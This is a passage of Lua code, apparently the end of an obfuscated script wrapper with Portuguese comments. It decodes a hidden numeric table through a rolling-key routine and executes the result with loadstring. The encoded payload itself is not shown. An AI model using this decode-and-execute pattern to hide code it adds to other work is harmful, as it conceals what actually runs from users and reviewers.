    local function VM_1lIl001I(d, k, m)
        local R_llI1I = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_llI1I, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_llI1I)
    end

    -- Execution Guard
    local F_I100O = loadstring(VM_1lIl001I(B_111l010O, 36, 5))
    if F_I100O then
        F_I100O(...)
    end
end)(...)
